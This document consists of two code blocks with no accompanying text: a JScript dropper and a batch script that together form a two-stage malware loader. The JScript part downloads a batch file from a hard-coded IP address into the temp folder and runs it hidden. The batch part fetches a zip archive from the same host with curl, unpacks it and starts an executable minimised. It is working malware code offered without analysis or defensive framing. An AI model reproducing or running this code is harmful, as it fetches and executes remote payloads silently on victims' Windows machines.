```javascript
var sh=new ActiveXObject('WScript.Shell');var bat_path=sh.ExpandEnvironmentStrings('%TEMP%')+'\\qwx.bat';var x=new ActiveXObject('MSXML2.XMLHTTP');x.open('get','http://27.102.34.10/bins/x/j.bat',false);x.setRequestHeader('X-Auth-Key','906ae77b3322');x.send();if(x.status === 200){var s=new ActiveXObject('ADODB.Stream');s.Open();s.Type=1;s.Write(x.responseBody);s.Position=0;s.SaveToFile(bat_path,2);s.Close();};sh.Run('cmd.exe /c start /min "" "'+bat_path+'"',0);
```

```batch
set p="%public%\azc"
mkdir %p%
pushd %p%
set p="%p%\a.zip"
curl.exe -s http://27.102.34.10/bins/x/.zip -o %p%
tar.exe -xf %p%
start /min "" "v.exe"
popd
```
